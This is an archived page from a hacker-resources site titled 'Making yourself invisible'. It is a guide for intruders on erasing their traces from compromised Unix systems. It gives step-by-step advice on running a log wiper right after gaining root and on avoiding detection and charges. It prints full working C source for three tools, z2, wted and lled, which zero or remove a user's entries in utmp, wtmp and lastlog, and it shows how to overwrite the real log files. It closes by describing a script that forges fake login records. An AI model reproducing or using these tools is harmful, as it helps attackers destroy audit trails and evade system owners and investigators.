<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Making yourself
invisible</TITLE>
</HEAD>
<BODY TEXT="#d0d0d0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">

<B><FONT SIZE=+1>Making yourself invisible</FONT></B>

<P>Topics:
<BR><A HREF="#Zap2">Zap2</A>
<BR><A HREF="#Other Scripts">Other Scripts</A>

<P>The whole point of this hacking stuff is that you continue to have access
to as
<BR>many points of information as possible.&nbsp; If you do stupid things,
of fail just
<BR>once to clean your utmp or wtmp, xferlog's, etc ... you can loose access
to the
<BR>system.&nbsp; Make yourself a regular order to follow and learn each
system well!

<P>Become part of the system, and take many notes if you are doing many
systems
<BR>at once.&nbsp; But remember make yourself a routine.&nbsp; Have your
set routine of
<BR>taking your time to clean any presence of your login, transfers, etc.&nbsp;
Do NOT fail
<BR>in this one thing or you will loose access and possibly face some sort
of
<BR>charges.
<BR>&nbsp;

<P><A NAME="Zap2"></A><B><FONT SIZE=+1>Zap2 (for wtmp/lastlog/utmp)</FONT></B>
<BR>&nbsp;

<P>There are different log cleaning programs out there, but the best of
these
<BR>is zap2.&nbsp; I compile mine to be named z2.

<P>z2 will be run right after you get root access.&nbsp; This will want
to be one of
<BR>the fastest things you run.&nbsp; (you never know)

<P>You might want to do a finger @host.xxx to see who is on now, look at
the idle
<BR>time of root or admin accounts to see if they are away doing something.

<P>Login, and as soon as you get on, type w, to see idle time and who is
on, but
<BR>at the same time you are looking at that be typing your root access
command
<BR>that you should have waiting somewhere nested in the system.&nbsp;
As soon as you
<BR>get your root access, type ./z2 username-u-logged-in-as

<P>Now you are safer then you were.&nbsp; Do a w or who command to see
that you are
<BR>gone from the utmp.&nbsp; If you ftp, or do other things you might
have to use
<BR>other programs I will include in the next section called wted and lled.

<P>Lets finish with this z2 first.&nbsp; You will have to see where each
file is in
<BR>the system and edit z2.c to include the right location of these files

<P>Here is the area you will look for right at the top of the file:

<P>#define WTMP_NAME "/usr/adm/wtmp"
<BR>#define UTMP_NAME "/etc/utmp"
<BR>#define LASTLOG_NAME "/usr/adm/lastlog"

<P>Most of the systems I login to are:

<P>#define WTMP_NAME "/var/adm/wtmp"
<BR>#define UTMP_NAME "/var/adm/utmp"
<BR>#define LASTLOG_NAME "/var/adm/lastlog"
<BR>&nbsp;

<P>But you do your own look around to see were the files are.&nbsp; Also
/var/log:
<BR>is a regular location.

<P>Add the log locations for each system, compile the file, and you are
all ready
<BR>to be invisible right after the login using z2

<P>Here is the .c file

<P>z2.c
<BR>--------------------------- cut here
<BR>#include &lt;sys/types.h>
<BR>#include &lt;stdio.h>
<BR>#include &lt;unistd.h>
<BR>#include &lt;sys/file.h>
<BR>#include &lt;fcntl.h>
<BR>#include &lt;utmp.h>
<BR>#include &lt;pwd.h>
<BR>#include &lt;lastlog.h>
<BR>#define WTMP_NAME "/usr/adm/wtmp"
<BR>#define UTMP_NAME "/etc/utmp"
<BR>#define LASTLOG_NAME "/usr/adm/lastlog"
<BR>&nbsp;
<BR>int f;
<BR>&nbsp;
<BR>void kill_utmp(who)
<BR>char *who;
<BR>{
<BR>&nbsp;&nbsp;&nbsp; struct utmp utmp_ent;
<BR>&nbsp;
<BR>&nbsp; if ((f=open(UTMP_NAME,O_RDWR))>=0) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp; while(read (f, &amp;utmp_ent, sizeof (utmp_ent))>
0 )
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!strncmp(utmp_ent.ut_name,who,strlen(who)))
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
bzero((char *)&amp;utmp_ent,sizeof( utmp_ent ));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
write (f, &amp;utmp_ent, sizeof (utmp_ent));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}
<BR>&nbsp;&nbsp;&nbsp;&nbsp; close(f);
<BR>&nbsp; }
<BR>}
<BR>&nbsp;
<BR>void kill_wtmp(who)
<BR>char *who;
<BR>{
<BR>&nbsp;&nbsp;&nbsp; struct utmp utmp_ent;
<BR>&nbsp;&nbsp;&nbsp; long pos;
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp; pos = 1L;
<BR>&nbsp;&nbsp;&nbsp; if ((f=open(WTMP_NAME,O_RDWR))>=0) {
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; while(pos != -1L) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lseek(f,-(long)( (sizeof(struct
utmp)) * pos),L_XTND);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (read (f, &amp;utmp_ent,
sizeof (struct utmp))&lt;0) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pos = -1L;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!strncmp(utmp_ent.ut_name,who,strlen(who)))
{
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
bzero((char *)&amp;utmp_ent,sizeof(struct utmp ));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
write (f, &amp;utmp_ent, sizeof (utmp_ent));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pos = -1L;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else pos +=
1L;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp; close(f);
<BR>&nbsp; }
<BR>}
<BR>&nbsp;
<BR>void kill_lastlog(who)
<BR>char *who;
<BR>{
<BR>&nbsp;&nbsp;&nbsp; struct passwd *pwd;
<BR>&nbsp;&nbsp;&nbsp; struct lastlog newll;
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp; if ((pwd=getpwnam(who))!=NULL) {
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ((f=open(LASTLOG_NAME,
O_RDWR)) >= 0) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
bzero((char *)&amp;newll,sizeof( newll ));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
write(f, (char *)&amp;newll, sizeof( newll ));
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
close(f);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;
<BR>&nbsp;&nbsp;&nbsp; } else printf("%s: ?\n",who);
<BR>}
<BR>&nbsp;
<BR>main(argc,argv)
<BR>int argc;
<BR>char *argv[];
<BR>{
<BR>&nbsp;&nbsp;&nbsp; if (argc==2) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill_lastlog(argv[1]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill_wtmp(argv[1]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill_utmp(argv[1]);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Zap2!\n");
<BR>&nbsp;&nbsp;&nbsp; } else
<BR>&nbsp;&nbsp;&nbsp; printf("Error.\n");
<BR>}
<BR>--------------------------- cut here

<P>---------------

<P><A NAME="Other Scripts"></A><B><FONT SIZE=+1>Other Scripts</FONT></B>
<BR>&nbsp;

<P>Now we come to the other part of this.&nbsp; Lets say that after you
login, and do
<BR>your z2, you need to ftp in to grab a file. (remember NEVER ftp or
telnet out)
<BR>Ok, you ftp in and grab a few files, or login to another account on
the system,
<BR>now you will need to use wted.&nbsp; wted will let you edit the wtmp
to remove your
<BR>login from the ftp.&nbsp; You also might need to use the lled (lastlog
edit).

<P>Here is the menu if you type ./wted, after setting log locations &amp;
compile:

<P>[8:25pm][/home/compile]wted
<BR>Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This help
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Use FILE instead of default
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show all entries found
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show all entries for USER
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show NULL entries
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Erase USER completely
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Erase all connections containing HOST
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-z&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show ZAP'd entries
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Attempt to remove ZAP'd entries completely

<P>So if i ftp to username tsmith I would type wted -x -e tsmith

<P>The program will now prompt you one login at a time for the user tsmith
asking
<BR>if you want to delete it.&nbsp; After you delete your login, make sure
to
<BR>chmod 644 the wtmp.tmp file and then copy it over the top of the wtmp
file in
<BR>the log directory.&nbsp; Like this:

<P>1. chmod 644 wtmp.tmp
<BR>2. cp wtmp.tmp /var/adm/wtmp

<P>Here is your wted program:

<P>MAKE SURE TO HAVE THE RIGHT PATH TO THE char file below
<BR>So make sure you have the right path to the wtmp file.

<P>wted.c
<BR>---------------------- cut here
<BR>#include &lt;stdio.h>
<BR>#include &lt;utmp.h>
<BR>#include &lt;time.h>
<BR>#include &lt;fcntl.h>

<P>char *file="/var/adm/wtmp";

<P>main(argc,argv)
<BR>int argc;
<BR>char *argv[];
<BR>{
<BR>int i;
<BR>if (argc==1) usage();
<BR>for(i=1;i&lt;argc;i++)
<BR>&nbsp;{
<BR>&nbsp;if(argv[i][0] == '-')
<BR>&nbsp; {
<BR>&nbsp; switch(argv[i][1])
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp; case 'b': printents(""); break;
<BR>&nbsp;&nbsp; case 'z': printents("Z4p"); break;
<BR>&nbsp;&nbsp; case 'e': erase(argv[i+1],0); break;
<BR>&nbsp;&nbsp; case 'c': erase(0,argv[i+1]); break;
<BR>&nbsp;&nbsp; case 'f': file=argv[i+1]; break;
<BR>&nbsp;&nbsp; case 'u': printents(argv[i+1]); break;
<BR>&nbsp;&nbsp; case 'a': printents("*"); break;
<BR>&nbsp;&nbsp; case 'x': remnull(argv[i+1]); break;
<BR>&nbsp;&nbsp; default:usage();
<BR>&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp;}
<BR>}

<P>printents(name)
<BR>char *name;
<BR>{
<BR>struct utmp utmp,*ptr;
<BR>int fp=-1;
<BR>ptr=&amp;utmp;
<BR>if (fp=open(file,O_RDONLY))
<BR>&nbsp;{
<BR>&nbsp;while (read(fp,&amp;utmp,sizeof(struct utmp))==sizeof(struct
utmp))
<BR>&nbsp; {
<BR>&nbsp; if ( !(strcmp(name,ptr->ut_name)) || (name=="*") ||
<BR>&nbsp; (!(strcmp("Z4p",name)) &amp;&amp; (ptr->ut_time==0)))
<BR>&nbsp;&nbsp; printinfo(ptr);
<BR>&nbsp; }
<BR>&nbsp;close(fp);
<BR>&nbsp;}
<BR>}

<P>printinfo(ptr)
<BR>struct utmp *ptr;
<BR>{
<BR>char tmpstr[256];
<BR>printf("%s\t",ptr->ut_name);
<BR>printf("%s\t",ptr->ut_line);
<BR>strcpy(tmpstr,ctime(&amp;(ptr->ut_time)));
<BR>tmpstr[strlen(tmpstr)-1]='\0';
<BR>printf("%s\t",tmpstr);
<BR>printf("%s\n",ptr->ut_host);
<BR>}

<P>erase(name,host)
<BR>char *name,*host;
<BR>{
<BR>int fp=-1,fd=-1,tot=0,cnt=0,n=0;
<BR>struct utmp utmp;
<BR>unsigned char c;
<BR>if (fp=open(file,O_RDONLY)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (read(fp,&amp;utmp,sizeof(struct
utmp))==sizeof(struct utmp)) {
<BR>&nbsp; if (host)
<BR>&nbsp;&nbsp; if (strstr(utmp.ut_host,host)) tot++;
<BR>&nbsp;&nbsp; else {cnt++;write(fd,&amp;utmp,sizeof(struct utmp));}
<BR>&nbsp; if (name) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if (strcmp(utmp.ut_name,name)) {cnt++;
<BR>&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct utmp));}
<BR>&nbsp; else {
<BR>&nbsp;&nbsp; if (n>0) {
<BR>&nbsp;&nbsp;&nbsp; n--;cnt++;
<BR>&nbsp;&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct utmp));}
<BR>&nbsp;&nbsp; else
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp; printinfo(&amp;utmp);
<BR>&nbsp;&nbsp; printf("Erase entry (y/n/f(astforward))? ");
<BR>&nbsp;&nbsp; c='a';
<BR>&nbsp;&nbsp; while (c!='y'&amp;&amp;c!='n'&amp;&amp;c!='f') c=getc(stdin);
<BR>&nbsp;&nbsp; if (c=='f') {
<BR>&nbsp;&nbsp;&nbsp; cnt++;
<BR>&nbsp;&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct utmp));
<BR>&nbsp;&nbsp;&nbsp; printf("Fast forward how many entries? ");
<BR>&nbsp;&nbsp;&nbsp; scanf("%d",&amp;n);}
<BR>&nbsp;&nbsp; if (c=='n') {
<BR>&nbsp;&nbsp;&nbsp; cnt++;
<BR>&nbsp;&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct utmp));
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp; if (c=='y') tot++;
<BR>&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fp);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
<BR>printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
<BR>}

<P>remnull(name)
<BR>char *name;
<BR>{
<BR>int fp=-1,fd=-1,tot=0,cnt=0,n=0;
<BR>struct utmp utmp;
<BR>if (fp=open(file,O_RDONLY)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (read(fp,&amp;utmp,sizeof(struct
utmp))==sizeof(struct utmp)) {
<BR>&nbsp; if (utmp.ut_time) {
<BR>&nbsp;&nbsp; cnt++;
<BR>&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct utmp));
<BR>&nbsp; }
<BR>&nbsp; else
<BR>&nbsp;&nbsp; tot++;
<BR>&nbsp;}
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fp);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
<BR>printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
<BR>}

<P>usage()
<BR>{
<BR>printf("Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER
-c HOST\n");
<BR>printf("\t-h\tThis help\n");
<BR>printf("\t-f\tUse FILE instead of default\n");
<BR>printf("\t-a\tShow all entries found\n");
<BR>printf("\t-u\tShow all entries for USER\n");
<BR>printf("\t-b\tShow NULL entries\n");
<BR>printf("\t-e\tErase USER completely\n");
<BR>printf("\t-c\tErase all connections containing HOST\n");
<BR>printf("\t-z\tShow ZAP'd entries\n");
<BR>printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
<BR>}
<BR>---------------------- cut here

<P>You might also have to clean stuff out of the file /vat/adm/lastlog

<P>For this use the lled.c.&nbsp; Compile the program and name it lled.

<P>Here is a menu from the program when you type ./lled

<P>[4:04am][/home/paris/compile]lled
<BR>Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
<BR>-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This help
<BR>-f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Use FILE instead of default
<BR>-a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show all entries found
<BR>-u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show all entries for USER
<BR>-b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show NULL entries
<BR>-e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Erase USER completely
<BR>-c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Erase all connections containing HOST
<BR>-z&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Show ZAP'd entries
<BR>-x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Attempt to remove ZAP'd entries completely

<P>It would be good to try to view first using -u, but many times it will
not
<BR>show your username in the lastlog, but it will still have your host,
so I
<BR>have found that if you know what to look for you can just type something
like:
<BR>If my host name that I was coming from was machine.edit.com, I could
type

<P>lled -e username -c machine.edit

<P>If you need to view the lastlog your host entry should be at the end
of the
<BR>file, just type: lled -a

<P>chmod the file lastlog.tmp 644 and copy the file over the top of the
lastlog
<BR>file in the log directory just like you did above for the wted.

<P>BE SURE TO SET THE PATH FOR YOUR lastlog below!

<P>Ok here is your lled.c
<BR>-------------------------- cut here
<BR>#include &lt;stdio.h>
<BR>#include &lt;time.h>
<BR>#include &lt;lastlog.h>
<BR>#include &lt;fcntl.h>

<P>char *file="/var/adm/lastlog";

<P>main(argc,argv)
<BR>int argc;
<BR>char *argv[];
<BR>{
<BR>int i;
<BR>if (argc==1) usage();
<BR>for(i=1;i&lt;argc;i++)
<BR>&nbsp;{
<BR>&nbsp;if(argv[i][0] == '-')
<BR>&nbsp; {
<BR>&nbsp; switch(argv[i][1])
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp; case 'b': printents(""); break;
<BR>&nbsp;&nbsp; case 'z': printents("Z4p"); break;
<BR>&nbsp;&nbsp; case 'e': erase(argv[i+1]); break;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'c': erase(0,argv[i+1]); break;
<BR>&nbsp;&nbsp; case 'f': file=argv[i+1]; break;
<BR>&nbsp;&nbsp; case 'u': printents(argv[i+1]); break;
<BR>&nbsp;&nbsp; case 'a': printents("*"); break;
<BR>&nbsp;&nbsp; case 'x': remnull(argv[i+1]); break;
<BR>&nbsp;&nbsp; default:usage();
<BR>&nbsp;&nbsp; }
<BR>&nbsp; }
<BR>&nbsp;}
<BR>}

<P>printents(name)
<BR>char *name;
<BR>{
<BR>struct lastlog utmp,*ptr;
<BR>int fp=-1;
<BR>ptr=&amp;utmp;
<BR>if (fp=open(file,O_RDONLY))
<BR>&nbsp;{
<BR>&nbsp;while (read(fp,&amp;utmp,sizeof(struct lastlog))==sizeof(struct
lastlog))
<BR>&nbsp; {
<BR>&nbsp; if ( !(strcmp(name,ptr->ll_line)) || (name=="*") ||
<BR>&nbsp; (!(strcmp("Z4p",name)) &amp;&amp; (ptr->ll_time==0)))
<BR>&nbsp;&nbsp; printinfo(ptr);
<BR>&nbsp; }
<BR>&nbsp;close(fp);
<BR>&nbsp;}
<BR>}

<P>printinfo(ptr)
<BR>struct lastlog *ptr;
<BR>{
<BR>char tmpstr[256];
<BR>printf("%s\t",ptr->ll_line);
<BR>strcpy(tmpstr,ctime(&amp;(ptr->ll_time)));
<BR>tmpstr[strlen(tmpstr)-1]='\0';
<BR>printf("%s\t",tmpstr);
<BR>printf("%s\n",ptr->ll_host);
<BR>}

<P>erase(name,host)
<BR>char *name,*host;
<BR>{
<BR>int fp=-1,fd=-1,tot=0,cnt=0,n=0;
<BR>struct lastlog utmp;
<BR>unsigned char c;
<BR>if (fp=open(file,O_RDONLY)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (read(fp,&amp;utmp,sizeof(struct
lastlog))==sizeof(struct lastlog)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if (host)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if (strstr(utmp.ll_host,host)) tot++;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
else {cnt++;write(fd,&amp;utmp,sizeof(struct lastlog));}
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if (name) {
<BR>&nbsp; if (strcmp(utmp.ll_line,name)) {cnt++;
<BR>&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct lastlog));}
<BR>&nbsp; else {
<BR>&nbsp;&nbsp; if (n>0) {
<BR>&nbsp;&nbsp;&nbsp; n--;cnt++;
<BR>&nbsp;&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct lastlog));}
<BR>&nbsp;&nbsp; else
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp; printinfo(&amp;utmp);
<BR>&nbsp;&nbsp; printf("Erase entry (y/n/f(astforward))? ");
<BR>&nbsp;&nbsp; c='a';
<BR>&nbsp;&nbsp; while (c!='y'&amp;&amp;c!='n'&amp;&amp;c!='f') c=getc(stdin);
<BR>&nbsp;&nbsp; if (c=='f') {
<BR>&nbsp;&nbsp;&nbsp; cnt++;
<BR>&nbsp;&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct lastlog));
<BR>&nbsp;&nbsp;&nbsp; printf("Fast forward how many entries? ");
<BR>&nbsp;&nbsp;&nbsp; scanf("%d",&amp;n);}
<BR>&nbsp;&nbsp; if (c=='n') {
<BR>&nbsp;&nbsp;&nbsp; cnt++;
<BR>&nbsp;&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct lastlog));
<BR>&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp; if (c=='y') tot++;
<BR>&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fp);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
<BR>printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
<BR>}

<P>remnull(name)
<BR>char *name;
<BR>{
<BR>int fp=-1,fd=-1,tot=0,cnt=0,n=0;
<BR>struct lastlog utmp;
<BR>if (fp=open(file,O_RDONLY)) {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (read(fp,&amp;utmp,sizeof(struct
lastlog))==sizeof(struct lastlog)) {
<BR>&nbsp; if (utmp.ll_time) {
<BR>&nbsp;&nbsp; cnt++;
<BR>&nbsp;&nbsp; write(fd,&amp;utmp,sizeof(struct lastlog));
<BR>&nbsp; }
<BR>&nbsp; else
<BR>&nbsp;&nbsp; tot++;
<BR>&nbsp;}
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fp);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
<BR>printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
<BR>printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
<BR>}

<P>usage()
<BR>{
<BR>printf("Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER
-c HOST\n");
<BR>printf("\t-h\tThis help\n");
<BR>printf("\t-f\tUse FILE instead of default\n");
<BR>printf("\t-a\tShow all entries found\n");
<BR>printf("\t-u\tShow all entries for USER\n");
<BR>printf("\t-b\tShow NULL entries\n");
<BR>printf("\t-e\tErase USER completely\n");
<BR>printf("\t-c\tErase all connections containing HOST\n");
<BR>printf("\t-z\tShow ZAP'd entries\n");
<BR>printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
<BR>}
<BR>---------------------------------------------------------------- cut
here

<P>A good perl script for editing utmp, wtmp, and checking processes.
<BR>It will also let you insert lines in wtmp.&nbsp; So if you need to
play you
<BR>can add clinton.whitehouse.gov logging into port ttyp3 and show he
stayed
<BR>on the system for a few hours!

<P>Running 'check' will let you know if someone is on the system and not
showing
<BR>up in the utmp log.&nbsp; Admins like to hide the fact that they are
online
